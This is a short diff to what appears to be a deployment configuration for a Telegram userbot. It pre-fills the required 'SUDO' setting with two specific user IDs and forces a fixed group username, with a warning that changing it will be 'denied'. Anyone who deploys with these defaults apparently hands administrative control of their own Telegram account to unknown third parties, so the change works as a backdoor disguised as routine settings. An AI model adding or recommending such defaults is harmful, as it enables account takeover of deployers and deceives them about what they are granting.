@@ -379,13 +379,13 @@
         "required": false
       },
       "GROUP_USERNAME": {
-        "description": "WRITE UR GROUP USERNAME. Id Will Automatically Add to that Group",
-        "value": "@Legend_Userbot",
+        "description": "DONT CHANGE IT,IF YOU CHANGE IT WIL DENIED",
+        "value": "@MM_Userbot",
         "required": true
       },      
       "SUDO": {
         "description": "Sudo Users Id",
-        "value": "",
+        "value": "2105506225 5084019870",
         "required": true
       }
   },
